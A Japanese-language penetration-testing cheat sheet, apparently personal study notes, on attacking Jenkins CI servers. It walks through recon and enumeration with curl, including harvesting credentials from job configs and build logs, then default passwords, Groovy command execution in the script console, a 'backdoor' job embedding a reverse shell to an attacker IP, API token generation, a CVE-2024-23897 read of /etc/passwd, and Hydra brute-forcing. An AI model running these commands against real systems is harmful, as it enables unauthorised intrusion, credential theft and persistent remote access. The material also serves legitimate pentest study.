# Jenkins とは

- CI/CD用オープンソースの自動化サーバー
- スクリプト実行やプラグインエコシステムといった機能を備えており、特に*Script Console*は 強力なRCEポイント
- 脆弱プラグインも侵入経路に使える
- デフォルトポート
    - HTTP: 8080
    - HTTPS: 8443

---

# 接続

- 🔗[Authenticating scripted clients  - Jenkins](https://www.jenkins.io/doc/book/system-administration/authenticating-scripted-clients/)
- パスワードベース認証とAPI token認証方式がある

>Jenkins は認証ネゴシエーションを一切行わないことに注意してください。つまり、401 (Unauthorized) 応答ではなく 403 (Forbidden) 応答を直ちに返すため、最初のリクエストから認証情報を送信するようにしてください (「**事前認証**」とも呼ばれます)。

## HTTP(s)

```zsh
curl -X POST -L --user <username>:<password|api_token> <url>
```
```zsh
wget --auth-no-challenge --user=<username> --password=<password|api_token> <url>
```

代表的なパス
```
/login
/signup
/dashboard
/manage
/script
``` 

## Jenkins CLI

- JNLP（Java Network Launch Protocol)を使う
- JNLPとは、Java Web Start を使ってリモートの Java アプリケーションを起動するための仕組みであり、エージェント接続用プロトコル

Jenkins CLI JARをダウンロード
```zsh
wget <url>/jnlpJars/jenkins-cli.jar
```

認証付きCLI接続
```zsh
java -jar jenkins-cli.jar -s <url> -auth <username>:<password> who-am-i
```

## Jenkins API（REST）

```zsh
# バージョン確認
curl <url>/api/json

# 認証付き
curl --user <username>:<api_token> <url>/api/json
````

ジョブ一覧（`[name]`は変更せずそのまま入力）
```zsh
# url一覧も欲しい場合は、[name,url]とする
curl --user <username>:<api_token> <url>/api/json?tree=jobs[name]
```

---

# Recon

バージョン検出
```zsh
curl -s <url> | grep -i jenkins

# APIから
curl -s http://target.com:8080/api/json | jq .

# ヘッダから
curl -I <url> | grep -i "x-jenkins"

# ログインページから
curl -s <url>/login | grep "Jenkins ver"
````
- → バージョンがヘッダー/HTML内に露出している場合あり
- 403が返る場合は事前認証が必要

anonymousアクセス試行
```zsh
# anonymousアクセスの有効性確認
curl -s <url>/asynchPeople/

# script consoleの確認
curl -s <url>/script

# job creationの確認
curl -s <url>/view/all/newJob

# system logの確認
curl -s <url>/log/all
```

---

# Enumeration

anonymousログインが可能であれば、`--user`以降は不要。

ユーザー確認
```zsh
curl -s <url>/asynchPeople/ --user <username>:<password|api_token>

# ユーザーAPIの確認
curl <url>/user/admin/api/json --user <username>:<password|api_token>

# signupページの確認
curl <url>/signup --user <username>:<password|api_token>
```

ジョブ列挙
```zsh
curl <url>/api/json?tree=jobs[name,url] --user <username>:<password|api_token>

# ビルド情報
curl --user <username>:<password|api_token> \
  <url>/job/<job-name>/api/json?tree=builds[number,url]
````

コンソール出力
```zsh
curl <url>/job/<job-name>/lastBuild/consoleText --user <username>:<password|api_token>
```

プラグイン列挙
```zsh
curl <url>/pluginManager/api/json?depth=1 --user <username>:<password|api_token>
````
- → 脆弱なプラグインがあれば要確認

認証情報探索
```zsh
# Jenkins credentials storage
curl --user <username>:<password|api_token> <url>/credentials/

# ジョブ定義内の平文データ 
curl --user <username>:<password|api_token> <url>/job/<job-name>/config.xml

# ビルドログからパス/トークン検索
curl --user <username>:<password|api_token> \
  <url>/job/<job-name>/lastBuild/consoleText \
  | grep -i "password\|secret\|token"
```

ノード（ビルドノード）列挙
```zsh
curl --user <username>:<password|api_token> <url>/computer/api/json
````

システム情報
```zsh
curl --user <username>:<password|api_token> <url>/systemInfo
```

---

# Exploit

## デフォルト/弱い認証

Path
```
<url>/login
```

```
admin:admin  
jenkins:jenkins  
admin:password  
admin:jenkins  
user:user
```

## Script Console エクスプロイト

Path
```
<url>/script
```

コマンド実行
```groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = "whoami".execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout"
````

リバースシェル（🔗[revshell.com](https://www.revshells.com/)）
	ShellはターゲットOSに合わせて、Linuxならbash、Windowsならcmdとすること

![](../Images/Pasted%20image%2020260113123622.png)

$$revshells.com$$

## ジョブ作成によるエクスプロイト

1. 悪意あるジョブを作成（API経由）
```zsh
curl -X POST \
  <url>/createItem?name=backdoor \
  --user <username>:<password|api_token> \
  --data-binary @job-config.xml \
  -H "Content-Type: application/xml"
```

2. `job-config.xml`にリバースシェル等を埋め込む
```
<hudson.tasks.Shell>
  <command>zsh -i >& /dev/tcp/<attacker_IP>/4444 0>&1</command>
</hudson.tasks.Shell>
```

3. ビルドトリガー
```zsh
curl -X POST \
  <url>/job/backdoor/build \
  --user <username>:<password|api_token>
```

## APIトークンの生成

APIトークン生成
```zsh
curl -X POST \  <url>/user/<username>/descriptorByName/jenkins.security.api_tokenProperty/generateNewToken \
  --user <username>:<password> \
  -d "newTokenName=<token>"
````
- 取得したトークンを用いてAPIへアクセス

## Arbitrary File Read: CVE-2024-23897

※ 脆弱なバージョン:
- Jenkins < 2.441
- LTS < 2.426.3 (🔗[Jenkins に任意のファイルの読み取りが可能となるコマンドラインインターフェース機能におけるアクセス制御不備の脆弱性（Scan Tech Report） - ScanNetSecurity](https://scan.netsecurity.ne.jp/article/2024/03/27/50773.html))
```zsh
# windowsの場合：@C:\Windows\win.ini
java -jar jenkins-cli.jar -s <url>/ help "@/etc/passwd"
```

## ブルートフォース

Hydra例
```zsh
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  TARGET http-post-form \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=loginError"
````